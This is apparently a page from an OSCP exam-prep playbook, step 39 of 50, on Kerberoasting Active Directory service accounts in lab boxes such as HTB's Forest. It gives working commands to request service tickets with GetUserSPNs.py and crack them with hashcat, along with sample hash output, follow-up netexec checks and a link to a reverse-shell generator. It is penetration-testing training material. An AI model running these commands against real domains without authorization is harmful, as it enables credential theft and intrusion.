# AD - Kerberoasting

**Step 39 of 50 · AD**

*Request service tickets for domain accounts with SPNs and crack them offline.*

## Run this

> **Why:** This command gathers the ad kerberoasting evidence needed to decide which documented route applies next.
```bash
GetUserSPNs.py $Domain/$Username:$Password -dc-ip $BoxIP -request
hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

## Example output

```

ServicePrincipalName                 Name
------------------------------------  --------
HTTP/web.htb.local:80                svc_web
$krb5tgs$23$*svc_web$HTB.LOCAL$...HASH...
```
## What did you get?

- [ ] A service ticket was captured → **Run `hashcat -m 13100 $BoxDir/loot/kerberoast.txt /usr/share/wordlists/rockyou.txt`, then go to Step 40 · [[AD - Credential Validation]]**
- [ ] No SPNs were returned → **Run `netexec smb $BoxIP -u $Username -p $Password`, then go to Step 40 · [[AD - Credential Validation]] with the credentials you already have**
- [ ] Kerberos reports clock skew → **Go to Step 35 · [[AD - Clock Sync]]**

## Notes

Kerberoasting targets service accounts with registered SPNs. It is separate from AS-REP roasting.

## Gotcha

> [!warning] 💡
> A successful ticket request does not prove the password is weak. The useful result is a cracked service-account password.
## Seen in
- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- AD technique reference

## Related stages

- [[AD - Service Scan]]
- [[AD - Credential Validation]]
- [[AD - BloodHound]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
